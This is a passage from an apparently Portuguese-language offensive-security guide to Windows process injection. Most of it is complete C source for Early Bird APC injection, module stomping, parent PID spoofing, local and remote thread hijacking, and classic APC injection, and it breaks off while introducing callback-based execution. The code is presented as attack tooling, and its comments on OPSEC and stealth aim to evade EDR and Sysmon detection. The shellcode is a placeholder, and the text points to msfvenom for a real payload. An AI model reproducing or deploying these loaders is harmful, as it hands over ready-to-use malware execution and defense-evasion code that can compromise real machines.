- O processo tem `CurrentDirectory` e argumentos de linha de comando que não correspondem ao PE real
- O hash do PE em memória difere do hash do arquivo em disco
- `PEB.ImageBaseAddress` não corresponde ao endereço esperado para o binário
- Ferramentas: Hollows Hunter, Moneta, qualquer EDR moderno com memory scanning

---

### 4. Early Bird APC Injection

#### Conceito

APC (Asynchronous Procedure Call) é um mecanismo do Windows onde uma função pode ser enfileirada para execução em uma thread específica. A thread executa as APCs enfileiradas quando entra em "alertable state" (via `WaitForSingleObjectEx`, `SleepEx`, etc.).

**Early Bird** explora o fato de que toda thread, ao ser criada, processa APCs enfileiradas **antes de executar seu entry point normal**. Isso significa que se você enfileirar uma APC em uma thread recém-criada (ainda suspensa), ela executará antes do código do processo original - daí "Early Bird".

**Vantagem principal sobre CreateRemoteThread:** o shellcode executa no contexto de uma thread legítima existente (a thread principal do processo), não em uma nova thread com stack suspeita.

#### Código C Completo

```c
#include <windows.h>
#include <stdio.h>

// Shellcode de exemplo (substitua pelo seu payload real)
unsigned char shellcode[] = {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f c
    // Coloque seu shellcode aqui
    0x90, 0x90, 0x90  // NOP sled (placeholder)
};

BOOL EarlyBirdAPC(const char* targetPath, unsigned char* pShellcode, SIZE_T shellcodeSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Passo 1: Criar processo alvo em estado SUSPENSO
    // O processo e criado mas a thread principal ainda nao executou nenhum codigo
    if (!CreateProcessA(
        targetPath,
        NULL,
        NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,  // Suspenso, sem janela
        NULL, NULL,
        &si, &pi
    )) {
        printf("[-] CreateProcess falhou: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] Processo criado suspenso: PID=%lu TID=%lu\n",
           pi.dwProcessId, pi.dwThreadId);

    // Passo 2: Alocar memoria no processo para o shellcode
    // OPSEC: usar RW primeiro, depois mudar para RX
    LPVOID pRemoteShellcode = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  // Comecar com RW (sem X)
    );

    if (!pRemoteShellcode) {
        printf("[-] VirtualAllocEx falhou: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }

    // Passo 3: Escrever shellcode na memoria alocada
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, pRemoteShellcode,
                            pShellcode, shellcodeSize, &bytesWritten)) {
        printf("[-] WriteProcessMemory falhou: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }

    printf("[+] Shellcode escrito em: 0x%p\n", pRemoteShellcode);

    // Muda protecao para RX antes de executar
    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, pRemoteShellcode, shellcodeSize,
                     PAGE_EXECUTE_READ, &oldProtect);

    // Passo 4: Enfileirar APC na thread principal SUSPENSA
    // QueueUserAPC enfileira uma APC na thread especificada.
    // A APC sera executada quando a thread entrar em "alertable state".
    // Para a thread principal em CREATE_SUSPENDED, isso ocorre ANTES do entry point normal,
    // quando o sistema inicializa a thread (esta e a parte "Early Bird").
    //
    // Nota: tecnicamente, a thread executa a APC antes de executar o CRT startup code,
    // o que significa que o ambiente C/C++ ainda nao esta inicializado.
    // Shellcodes funcionam bem aqui porque sao independentes do CRT.
    DWORD apcResult = QueueUserAPC(
        (PAPCFUNC)pRemoteShellcode,  // Funcao a executar (nosso shellcode)
        pi.hThread,                   // Thread alvo (thread principal suspensa)
        0                             // Parametro para a funcao APC
    );

    if (!apcResult) {
        printf("[-] QueueUserAPC falhou: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }

    printf("[+] APC enfileirada na thread %lu\n", pi.dwThreadId);

    // Passo 5: Retomar a thread
    // Quando ResumeThread e chamado, a thread entra em alertable state
    // e processa as APCs enfileiradas ANTES de executar o entry point
    // Isso e o "Early Bird" - nosso shellcode executa primeiro
    ResumeThread(pi.hThread);

    printf("[+] Thread retomada. Shellcode deve executar antes do entry point\n");
    printf("[+] Early Bird APC completo! PID=%lu\n", pi.dwProcessId);

    // Aguarda um pouco para o shellcode inicializar
    WaitForSingleObject(pi.hProcess, 3000);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Uso: %s <processo_alvo.exe>\n", argv[0]);
        return 1;
    }

    if (!EarlyBirdAPC(argv[1], shellcode, sizeof(shellcode))) {
        printf("[-] Early Bird APC falhou\n");
        return 1;
    }

    return 0;
}
```

**Por que Early Bird é preferível a CreateRemoteThread:**
- A thread executando o shellcode é a thread **legitima** do processo (thread ID low, stack tem frames legítimos de inicialização)
- Não aparece como nova thread anômala
- A stack call parece o startup normal do processo

**Desvantagem:**
- O shellcode executa antes do processo estar totalmente inicializado
- Se o shellcode depende de DLLs que ainda não foram carregadas = crash
- Shellcodes position-independent que resolvem APIs dinamicamente funcionam bem

#### APC Internals — Kernel vs User APC

Para entender por que Early Bird funciona, é necessário conhecer os dois tipos de APC:

| Tipo | Quando executa | Preemptível |
|------|---------------|-------------|
| **Kernel APC** | Em qualquer momento quando thread em modo kernel | Sim — executa imediatamente |
| **User APC** | Apenas quando thread está em **alertable wait** | Não — thread precisa cooperar |

`QueueUserAPC` enfileira uma **User APC**. A thread só a processa quando entrar em alertable state.

**Alertable wait states** (funções que permitem APCs):
```c
SleepEx(dwMilliseconds, TRUE);              // bAlertable = TRUE
WaitForSingleObjectEx(hObject, INFINITE, TRUE);
WaitForMultipleObjectsEx(n, handles, FALSE, INFINITE, TRUE);
MsgWaitForMultipleObjectsEx(n, handles, 0, QS_ALLINPUT, MWMO_ALERTABLE);
SignalObjectAndWait(hToSignal, hToWait, INFINITE, TRUE);
```

**ETHREAD — campo `PendingAPCs`:**
- Cada KTHREAD tem uma lista de APCs pendentes (ApcState.UserApcPending)
- Quando thread sai de alertable wait: kernel entrega APCs na ordem FIFO
- APC injetada via `QueueUserAPC` fica na `ApcState.UserApcListHead` do KTHREAD alvo

**APC Injection em Thread Existente (não Early Bird):**
```c
// Encontrar thread de processo alvo em alertable wait state
// (via NtQuerySystemInformation ou análise de estado de thread)
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, alertableThreadId);

// Enfileirar APC
QueueUserAPC((PAPCFUNC)remoteShellcodeAddr, hThread, 0);
// A APC executa na próxima vez que a thread chamar Sleep/Wait com bAlertable=TRUE
CloseHandle(hThread);
```

**Limitation:** Thread precisa estar em alertable wait. Estratégia: injetar em threads que frequentemente chamam `SleepEx(1000, TRUE)` ou `WaitForMultipleObjectsEx` com alertable=TRUE (common in svchost threads, worker threads).

---

### 5. Module Stomping como Injeção

#### Conceito

Module Stomping (também chamado de Module Overwriting) resolve o problema de injeção de shellcode em memória `MEM_PRIVATE`: ao invés de alocar nova memória privada, você sobrescreve a seção `.text` de uma DLL **legítima já carregada** no processo.

A DLL sobrescrita permanece no mapa de módulos do processo com nome e path legítimos. A região de memória permanece do tipo `MEM_IMAGE` (backed by file on disk). O shellcode executa de dentro de uma região que "parece" legítima.

**Escolha da DLL alvo:** prefira DLLs de terceiros ou DLLs do sistema raramente usadas que não são monitoradas (ex: `xpsservices.dll`, uma DLL de impressão XPS que raramente tem suas funções chamadas).

#### Código C Completo

```c
#include <windows.h>
#include <psapi.h>
#include <stdio.h>

// Encontra o modulo carregado pelo nome e retorna seu handle e endereco base
BOOL FindLoadedModule(HANDLE hProcess, const char* moduleName,
                      HMODULE* phModule, LPVOID* pBaseAddr) {
    HMODULE hMods[1024];
    DWORD cbNeeded;

    if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
        return FALSE;

    DWORD numModules = cbNeeded / sizeof(HMODULE);
    char modName[MAX_PATH];

    for (DWORD i = 0; i < numModules; i++) {
        if (GetModuleBaseNameA(hProcess, hMods[i], modName, sizeof(modName))) {
            if (_stricmp(modName, moduleName) == 0) {
                *phModule = hMods[i];
                *pBaseAddr = (LPVOID)hMods[i];
                return TRUE;
            }
        }
    }
    return FALSE;
}

// Forca o processo alvo a carregar uma DLL especifica
BOOL ForceLoadDLL(HANDLE hProcess, HANDLE hThread, const char* dllName) {
    // Similar a DLL injection classica - carrega a DLL legitima
    // que depois sera "stomped"
    LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(dllName) + 1,
                                        MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pRemotePath, dllName, strlen(dllName) + 1, NULL);

    LPVOID pLoadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0,
                                            (LPTHREAD_START_ROUTINE)pLoadLib,
                                            pRemotePath, 0, NULL);
    WaitForSingleObject(hLoadThread, 5000);
    CloseHandle(hLoadThread);
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    return TRUE;
}

// Module Stomping: carrega DLL legitima e sobrescreve .text com shellcode
BOOL ModuleStomping(DWORD targetPid, const char* dllToStomp,
                    unsigned char* shellcode, SIZE_T shellcodeSize) {
    // Abre o processo alvo
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] OpenProcess falhou: %lu\n", GetLastError());
        return FALSE;
    }

    // Carrega a DLL legitima no processo alvo (se nao estiver ja carregada)
    printf("[*] Carregando DLL alvo: %s\n", dllToStomp);
    ForceLoadDLL(hProcess, NULL, dllToStomp);

    // Aguarda o carregamento
    Sleep(500);

    // Encontra o modulo carregado e seu endereco base
    HMODULE hTargetMod;
    LPVOID pModBase;
    if (!FindLoadedModule(hProcess, dllToStomp, &hTargetMod, &pModBase)) {
        printf("[-] Modulo nao encontrado no processo\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Modulo encontrado em: 0x%p\n", pModBase);

    // Le os headers do modulo para encontrar a secao .text
    // Precisamos ler o PE header do processo remoto
    IMAGE_DOS_HEADER dosHeader;
    ReadProcessMemory(hProcess, pModBase, &dosHeader, sizeof(dosHeader), NULL);

    IMAGE_NT_HEADERS ntHeaders;
    ReadProcessMemory(hProcess,
                      (LPVOID)((ULONG_PTR)pModBase + dosHeader.e_lfanew),
                      &ntHeaders, sizeof(ntHeaders), NULL);

    // Percorre as sections para encontrar .text
    PIMAGE_SECTION_HEADER pSections = (PIMAGE_SECTION_HEADER)
        ((ULONG_PTR)pModBase + dosHeader.e_lfanew +
         sizeof(IMAGE_NT_HEADERS));

    // Lemos as sections do processo remoto
    WORD numSections = ntHeaders.FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER sections[64];
    ReadProcessMemory(hProcess, pSections, sections,
                      numSections * sizeof(IMAGE_SECTION_HEADER), NULL);

    LPVOID pTextSection = NULL;
    DWORD textSectionSize = 0;

    for (WORD i = 0; i < numSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            pTextSection = (LPVOID)((ULONG_PTR)pModBase + sections[i].VirtualAddress);
            textSectionSize = sections[i].Misc.VirtualSize;
            printf("[+] Secao .text: 0x%p, tamanho=%lu\n", pTextSection, textSectionSize);
            break;
        }
    }

    if (!pTextSection || textSectionSize < shellcodeSize) {
        printf("[-] Secao .text nao encontrada ou muito pequena\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    // Muda protecao da secao .text para permitir escrita
    // (DLLs carregadas tem .text como PAGE_EXECUTE_READ por padrao)
    DWORD oldProtect;
    VirtualProtectEx(hProcess, pTextSection, shellcodeSize,
                     PAGE_EXECUTE_READWRITE, &oldProtect);

    // Sobrescreve o inicio da secao .text com nosso shellcode
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pTextSection,
                            shellcode, shellcodeSize, &bytesWritten)) {
        printf("[-] WriteProcessMemory (stomp) falhou: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Restaura protecao original (opcional, mas mais furtivo)
    VirtualProtectEx(hProcess, pTextSection, shellcodeSize,
                     PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] Shellcode escrito em secao .text da DLL\n");

    // Cria thread que executa a partir do inicio da secao .text
    // que agora contem nosso shellcode
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pTextSection,
        NULL, 0, NULL
    );

    if (!hThread) {
        printf("[-] CreateRemoteThread falhou: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Thread executando shellcode da secao .text da DLL legítima\n");
    printf("[+] Module Stomping completo!\n");

    // Advantage: o shellcode e executado de uma regiao MEM_IMAGE
    // que e backed by file on disk - muito menos suspeito que MEM_PRIVATE

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}
```

**Por que Module Stomping é eficaz:**
- A memória executando o shellcode é `MEM_IMAGE` backed by `xpsservices.dll` (ou outra DLL legítima)
- O módulo aparece com nome e caminho corretos no listador de módulos
- Detecção requer hash comparison da DLL em disco vs. em memória (custoso para EDRs)

---

### 6. Parent PID Spoofing

#### Conceito

Quando um processo é criado no Windows, ele herda uma referência ao processo pai (PPID). Ferramentas de monitoramento e analistas verificam a árvore de processos para detectar anomalias: `cmd.exe` spawado por `winword.exe` é suspeito; spawado por `explorer.exe` é normal.

Parent PID Spoofing usa a API `UpdateProcThreadAttribute` com `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` para especificar um parent process **diferente do processo que está criando o filho**. O filho aparece na árvore de processos como filho do processo especificado.

**Uso típico:** fazer seu implante aparecer como filho de `explorer.exe`, `svchost.exe`, ou qualquer processo plausível para o binário que você está spawnando.

#### Código C Completo

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Encontra o handle de um processo pelo nome para usar como "pai falso"
HANDLE GetProcessHandleByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    HANDLE hResult = NULL;

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                // Precisamos de PROCESS_CREATE_PROCESS para usar como parent
                hResult = OpenProcess(PROCESS_CREATE_PROCESS, FALSE,
                                      pe.th32ProcessID);
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return hResult;
}

// Cria um processo com Parent PID falsificado
// spoofedParentName: nome do processo que aparecera como pai (ex: L"explorer.exe")
// childPath: processo a ser criado (ex: L"C:\\Windows\\System32\\cmd.exe")
BOOL SpawnWithFakeParent(const wchar_t* spoofedParentName, const wchar_t* childPath) {
    // Passo 1: Obtem handle do processo que usaremos como "pai falso"
    // Este handle precisa de PROCESS_CREATE_PROCESS
    HANDLE hFakeParent = GetProcessHandleByName(spoofedParentName);
    if (!hFakeParent) {
        wprintf(L"[-] Nao foi possivel obter handle de '%s': %lu\n",
                spoofedParentName, GetLastError());
        return FALSE;
    }
    wprintf(L"[+] Handle do pai falso obtido: 0x%p (%s)\n",
            hFakeParent, spoofedParentName);

    // Passo 2: Configura a lista de atributos para o novo processo
    // PROC_THREAD_ATTRIBUTE_LIST permite especificar atributos estendidos
    SIZE_T attrListSize = 0;

    // Primeira chamada para obter o tamanho necessario da lista
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);

    PPROC_THREAD_ATTRIBUTE_LIST pAttrList =
        (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
            GetProcessHeap(), 0, attrListSize);

    if (!InitializeProcThreadAttributeList(pAttrList, 1, 0, &attrListSize)) {
        printf("[-] InitializeProcThreadAttributeList falhou: %lu\n", GetLastError());
        CloseHandle(hFakeParent);
        HeapFree(GetProcessHeap(), 0, pAttrList);
        return FALSE;
    }

    // Passo 3: Adiciona o atributo PARENT_PROCESS a lista
    // Este e o atributo que falsifica o PPID
    if (!UpdateProcThreadAttribute(
        pAttrList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,  // Atributo para falsificar PPID
        &hFakeParent,                           // Ponteiro para handle do pai falso
        sizeof(HANDLE),
        NULL, NULL
    )) {
        printf("[-] UpdateProcThreadAttribute falhou: %lu\n", GetLastError());
        DeleteProcThreadAttributeList(pAttrList);
        CloseHandle(hFakeParent);
        HeapFree(GetProcessHeap(), 0, pAttrList);
        return FALSE;
    }

    // Passo 4: Configura STARTUPINFOEX com a lista de atributos
    // STARTUPINFOEX e a versao estendida de STARTUPINFO
    STARTUPINFOEXW si = { 0 };
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    si.lpAttributeList = pAttrList;

    // Oculta janela do processo filho (OPSEC)
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;

    // Cria uma copia modificavel da string de comando (CreateProcess nao aceita const)
    wchar_t cmdLine[MAX_PATH];
    wcsncpy_s(cmdLine, MAX_PATH, childPath, _TRUNCATE);

    // Passo 5: Cria o processo filho com o PPID falsificado
    // EXTENDED_STARTUPINFO_PRESENT: indica que si e uma STARTUPINFOEX
    if (!CreateProcessW(
        NULL,           // lpApplicationName (NULL = usa cmdLine)
        cmdLine,        // lpCommandLine
        NULL, NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL,
        (LPSTARTUPINFOW)&si,  // Cast necessario
        &pi
    )) {
        printf("[-] CreateProcess com PPID spoofing falhou: %lu\n", GetLastError());
        DeleteProcThreadAttributeList(pAttrList);
        CloseHandle(hFakeParent);
        HeapFree(GetProcessHeap(), 0, pAttrList);
        return FALSE;
    }

    wprintf(L"[+] Processo criado: PID=%lu\n", pi.dwProcessId);
    wprintf(L"[+] Aparece como filho de: %s\n", spoofedParentName);
    wprintf(L"[+] (verificar com Process Hacker/Explorer)\n");

    // Cleanup
    DeleteProcThreadAttributeList(pAttrList);
    CloseHandle(hFakeParent);
    HeapFree(GetProcessHeap(), 0, pAttrList);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        wprintf(L"Uso: %s <processo_pai_falso> <processo_filho>\n", argv[0]);
        wprintf(L"Exemplo: %s explorer.exe C:\\Windows\\System32\\cmd.exe\n", argv[0]);
        return 1;
    }

    // Exemplo: faz cmd.exe parecer filho de explorer.exe
    if (SpawnWithFakeParent(argv[1], argv[2])) {
        wprintf(L"[+] PPID Spoofing bem-sucedido!\n");
        return 0;
    }

    return 1;
}
```

**Verificando o PPID spoofing:**
```powershell
# Process Hacker mostrara o pai incorreto na arvore
# PowerShell para verificar
Get-CimInstance Win32_Process | Select-Object ProcessId, Name, ParentProcessId | Sort-Object ProcessId
```

**Combinando com outras técnicas:**
PPID Spoofing é frequentemente usado em conjunto com outras técnicas de injeção:
1. Criar processo com PPID spoofado (aparece como filho de `explorer.exe`)
2. Process Hollow esse processo com o payload real
3. Resultado: processo com PPID legítimo e conteúdo malicioso

---

### 7. Thread Hijacking — Local

**Conceito**: ao invés de `CreateRemoteThread` (entry point aponta para payload — flag óbvia em EDR), hijackeia uma thread *existente* modificando seu `CONTEXT.Rip/Eip` para o shellcode. Quando a thread retoma, executa o payload. Vantagem: thread aparece como rotineira ao invés de criada para malware.

**Por que ataca thread context**:
- `CreateThread`'s `lpStartAddress` aponta para o payload → trivially detectável (Sysmon Event ID 8 captura)
- Thread hijacking: `lpStartAddress` aponta para função benigna → thread parece legítima
- Modificação do `RIP/EIP` via `SetThreadContext` é menos hookada que `CreateRemoteThread`

**APIs envolvidas**:
- `GetThreadContext` — retorna `CONTEXT` (registers + stack info) da thread suspensa
- `SetThreadContext` — escreve `CONTEXT` modificado de volta
- `CONTEXT.ContextFlags = CONTEXT_CONTROL` é obrigatório antes do `GetThreadContext` para garantir que registers de controle (RIP/EIP) sejam populados

**Pré-requisito**: thread alvo deve estar **suspensa**. Não atacar `mainCRTStartup` thread local — ela está executando o código atual.

#### Implementação Completa

```c
BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID   pAddress        = NULL;
    DWORD   dwOldProtection = 0;
    CONTEXT ThreadCtx       = { .ContextFlags = CONTEXT_CONTROL };

    // Alocar + copiar payload
    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAlloc Failed: %d\n", GetLastError());
        return FALSE;
    }
    memcpy(pAddress, pPayload, sPayloadSize);

    // RW → RX para evitar alocação RWX direta
    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed: %d\n", GetLastError());
        return FALSE;
    }

    // Obter context original
    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] GetThreadContext Failed: %d\n", GetLastError());
        return FALSE;
    }

    // Patch RIP para apontar para payload
    ThreadCtx.Rip = (DWORD64)pAddress;   // x64; usar Eip em x86

    // Escrever context modificado
    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] SetThreadContext Failed: %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main() {
    HANDLE hThread = NULL;

    // Sacrificial thread em estado suspenso, com função dummy
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&DummyFunction,
                           NULL, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread Failed: %d\n", GetLastError());
        return -1;
    }

    if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {
        return -1;
    }

    ResumeThread(hThread);  // dispara execução do payload

    printf("[#] Press <Enter> to quit...");
    getchar();
    return 0;
}
```

**OPSEC**: DummyFunction deve parecer plausível (ex: rotina de processamento de dados, callback timer). Stack analysis em forense vai pegar o `RIP` apontando para alloc não-imagem — combinar com **Module Stomping** (técnica 5) para que a alloc apareça em região de DLL legítima.

---

### 8. Thread Hijacking — Remote

Mesmo conceito, mas em processo *outro*. Permite executar payload em contexto de processo legítimo sem `CreateRemoteThread`.

**Workflow**:
1. `CreateProcessA` com `CREATE_SUSPENDED` → cria processo sacrificial (todas threads suspensas)
2. `VirtualAllocEx` + `WriteProcessMemory` + `VirtualProtectEx` → injetar shellcode no remoto
3. Pegar handle de thread retornado por `CreateProcessA` (já suspensa)
4. `GetThreadContext` → patch `Rip` → `SetThreadContext` → `ResumeThread`

```c
BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId,
                            OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    CHAR                lpPath[MAX_PATH * 2];
    CHAR                WnDr[MAX_PATH];
    STARTUPINFO         Si  = { 0 };
    PROCESS_INFORMATION Pi  = { 0 };

    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
    Si.cb = sizeof(STARTUPINFO);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) return FALSE;
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {
        printf("[!] CreateProcessA Failed: %d\n", GetLastError());
        return FALSE;
    }

    *dwProcessId = Pi.dwProcessId;
    *hProcess    = Pi.hProcess;
    *hThread     = Pi.hThread;

    return (*dwProcessId && *hProcess && *hThread);
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode,
                                     IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD  dwOldProtection       = 0;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) return FALSE;

    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)
        || sNumberOfBytesWritten != sSizeOfShellcode) {
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode,
                          PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        return FALSE;
    }
    return TRUE;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
    CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_CONTROL };

    if (!GetThreadContext(hThread, &ThreadCtx)) return FALSE;
    ThreadCtx.Rip = (DWORD64)pAddress;

    if (!SetThreadContext(hThread, &ThreadCtx)) return FALSE;

    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);
    return TRUE;
}

int main() {
    DWORD  dwPid     = 0;
    HANDLE hProcess  = NULL, hThread = NULL;
    PVOID  pPayloadAddr = NULL;

    if (!CreateSuspendedProcess("notepad.exe", &dwPid, &hProcess, &hThread)) return -1;
    if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pPayloadAddr)) return -1;
    if (!HijackThread(hThread, pPayloadAddr)) return -1;

    return 0;
}
```

**Vs CreateRemoteThread**: CreateRemoteThread dispara Sysmon Event 8 (CreateRemoteThread) com thread start em endereço óbvio. Thread Hijacking + ResumeThread aparece apenas em Sysmon Event 1 (ProcessCreate) — muito mais comum, menos alertante.

---

### 9. APC Injection (Clássico)

**Asynchronous Procedure Calls (APC)** são funções enfileiradas para execução em uma thread quando ela entra em **alertable state** (`SleepEx`, `WaitForSingleObjectEx`, `MsgWaitForMultipleObjectsEx`). Diferente de Early Bird APC (técnica 4), o clássico não cria processo novo — enfileira APC em thread existente.

**Vantagem**: não cria thread visível, não chama `CreateRemoteThread`. **Desvantagem**: depende da thread alvo entrar em alertable state em algum momento — não há controle direto.

**APIs**:
- `OpenThread` — obter handle da thread alvo
- `QueueUserAPC` — enfileirar função para execução
- A thread executa a APC quando ela mesma entra em alertable wait

```c
// Tipo da APC routine
typedef VOID (NTAPI* PAPCFUNC)(ULONG_PTR Parameter);

BOOL InjectShellcodeViaAPC(IN DWORD dwTargetPid, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    HANDLE hProcess = NULL, hThread = NULL;
    PVOID  pRemoteBuffer = NULL;
    SIZE_T sBytesWritten = 0;
    DWORD  dwOldProtect = 0;

    // 1. Abrir processo alvo
    hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                           FALSE, dwTargetPid);
    if (!hProcess) return FALSE;

    // 2. Alocar memória no processo alvo
    pRemoteBuffer = VirtualAllocEx(hProcess, NULL, sPayloadSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuffer) { CloseHandle(hProcess); return FALSE; }

    // 3. Escrever payload
    if (!WriteProcessMemory(hProcess, pRemoteBuffer, pPayload, sPayloadSize, &sBytesWritten)) {
        CloseHandle(hProcess);
        return FALSE;
    }

    // 4. RW → RX
    if (!VirtualProtectEx(hProcess, pRemoteBuffer, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        CloseHandle(hProcess);
        return FALSE;
    }

    // 5. Enumerar threads do processo alvo, enfileirar APC em cada uma
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == dwTargetPid) {
                hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    QueueUserAPC((PAPCFUNC)pRemoteBuffer, hThread, NULL);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);

    CloseHandle(hProcess);
    return TRUE;
}
```

**Trigger**: enfileirar em **todas as threads** do processo alvo aumenta chance de uma delas entrar em alertable wait. Threads de processos GUI (explorer, browser) entram em alertable wait frequentemente (message loops).

**Distinção Kernel vs User APC**:
- User-mode APC (`QueueUserAPC`) — dispara quando thread chama `*Ex` alertable wait
- Kernel-mode APC — dispara sempre, mesmo sem alertable wait (apenas drivers podem agendar)

---

### 10. Callback Code Execution

Windows expõe **dezenas de APIs que aceitam callback functions** como parâmetro. Usar um callback como vetor de execução evita `CreateThread`/`CreateRemoteThread` + esconde execução em chamada legítima.

**APIs comuns com callback**:

| API | Tipo callback | Quando dispara |
|-----|--------------|----------------|
| `EnumDesktopWindows` | `WNDENUMPROC` | Para cada window |
| `EnumChildWindows` | `WNDENUMPROC` | Para cada child window |
| `EnumFontFamiliesExW` | `FONTENUMPROC` | Para cada font |
| `EnumPageFilesA` | `PENUM_PAGE_FILE_CALLBACK` | Para cada pagefile |
| `CertEnumSystemStore` | `PFN_CERT_ENUM_SYSTEM_STORE` | Para cada cert store |
| `CertEnumSystemStoreLocation` | `PFN_CERT_ENUM_SYSTEM_STORE_LOCATION` | Para cada location |
| `EnumResourceTypesA` | `ENUMRESTYPEPROC` | Para cada resource type |
| `CreateTimerQueueTimer` | `WAITORTIMERCALLBACK` | Em intervalo de tempo |
| `EnumSystemLocalesA` | `LOCALE_ENUMPROC` | Para cada locale |

**Padrão de uso**:

```c
// Shellcode tem prototype compatível com WNDENUMPROC (BOOL CALLBACK(HWND, LPARAM))
